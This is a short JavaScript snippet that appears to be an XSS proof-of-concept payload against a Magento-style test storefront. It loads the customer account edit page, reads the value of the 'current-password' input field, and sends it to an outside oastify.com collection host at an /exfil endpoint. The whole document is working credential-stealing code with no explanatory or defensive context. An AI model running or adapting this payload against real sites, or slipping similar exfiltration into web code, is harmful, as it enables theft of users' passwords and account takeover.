// Fetch the HTML content of the specified URL
fetch('https://m2.test/customer/account/edit/')
  .then(response => response.text())
  .then(html => {
    // Create a temporary container to hold the HTML content
    const container = document.createElement('div');
    container.innerHTML = html;

    // Extract the value from the "current-password" input field
    const passwordValue = container.querySelector('#current-password').value;

    // Send the value to another domain
    fetch('https://mxhi9v9t59sf1s8ogt02prbq49vfm3cr1.oastify.com/exfil?data=' + encodeURIComponent(passwordValue), {
      method: 'POST', // or 'GET' depending on your requirements
      headers: {
        'Content-Type': 'application/json'
        // Add any additional headers if needed
      },
      // body: JSON.stringify({ data: passwordValue }) // If using POST
    })
    .then(response => response.json())
    .then(data => console.log(data))
    .catch(error => console.error('Error sending data:', error));
  })
  .catch(error => console.error('Error fetching data:', error));
